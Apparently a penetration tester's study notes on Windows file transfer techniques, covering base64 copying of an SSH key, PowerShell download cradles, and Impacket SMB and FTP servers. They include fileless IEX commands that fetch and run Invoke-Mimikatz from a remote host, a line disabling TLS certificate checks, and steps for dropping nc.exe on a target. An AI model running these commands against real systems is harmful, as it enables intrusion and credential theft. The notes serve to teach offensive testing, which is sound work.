# Windows file transfer

## Downloads (from our linux machine to target windows machine)
- Powershell Base64 Encode and decode
	- Don't need network communication. Encode file to base64 string, manually copy contents from terminal and perform reverse operation, decoding file in original content.
	- eg. want to transfer an ssh key to Windows machine
	- 1. Check the MD5 hash, for use later
		- md5sum id_rsa
	- 2. Encode the file to base 64
		- cat id_rsa | base64 -w 0; echo
	- 3. Copy and paste the output to a Windows Powershell terminal
	- 4. `[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("the_string"))
	- 5. Confirming the hashes match
		- Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
- Powershell web downloads
	- Powershell WebClient provides methods for downloading data from resource.
	- DownloadFile method
		- `(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
			- ``(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
	- DownloadString - Fileless method
		- Uses some OS functions to download payload and **execute it directly**
		- `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')`
		- `(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
	- Invoke-WebRequest
		- Powershell 3.0 onwards
		- `Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1`
	- https://gist.github.com/HarmJ0y/bb48307ffa663256e239
		- List of Powershell download cradles
		- Be aware of nuances, eg. lack of proxy awareness or touching disk (downloading file onto target)
- Common errors with Powershell
	- Internet Explorer first-launch config not completed
		- Bypassed with the -UseBasicParsing flag
		- ` Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX`
	- SSL/TLS secure channel, cert not trusted
		- Bypass with
		- `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
- SMB Downloads
	- Create SMB server in our machine with smbserver.impacket from Impacket
		- `sudo impacket-smbserver share -smb2support /tmp/smbshare`
	- Then on target
		- `copy \\192.168.220.133\share\nc.exe`
	- Note: new versions of windows block unauthenticated guest access
		- `You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
		- To solve this, we set username and password using our Impacket SMB server, then mount the SMB server on windows machine
			- `sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
			- on target: `net use n: \\192.168.220.133\share /user:test test
- FTP downloads
	- Configure FTP server in our machine
		- `sudo pip3 install pyftpdlib`
		- `sudo python3 -m pyftpdlib --port 21
		- 


`